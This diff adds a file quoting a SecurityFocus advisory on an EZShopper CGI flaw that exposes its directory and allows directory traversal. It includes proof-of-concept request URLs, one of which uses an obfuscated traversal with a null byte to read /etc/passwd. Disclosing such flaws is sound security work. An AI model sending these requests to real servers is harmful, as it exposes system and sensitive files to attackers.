@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/2109/info
+
+It is possible for a remote user to gain read access to various files that reside within the EZShopper directory. By requesting a specially crafted URL utilizing loadpage.cgi' application with a '/' appended, EZShopper will disclose the contents within the EZShopper directory. As a result, it is possible for an attacker to navigate into its subdirectories and view any file.
+
+It is also reported that this same CGI application allows directory traversal sequences to be utilized to retrieve the contents of arbitrary Web server accessible files.
+
+Successful exploitation of this vulnerability could lead to the disclosure of sensitive information and possibly assist in further attacks against the victim. 
+
+EZshopper v3.0:
+http://www.example.com/cgi-bin/ezshopper3/loadpage.cgi?user_id=id&file=/
+
+EZshopper v2.0:
+http://www.example.com/cgi-bin/ezshopper2/loadpage.cgi?id+/
+
+Zero X <Zero_X@excluded.org> provided the following example:
+http://www.example.com/cgi-bin/loadpage.cgi?user_id=id&file=.|./.|./.|./.|./.|./etc/passwd%00.html
+
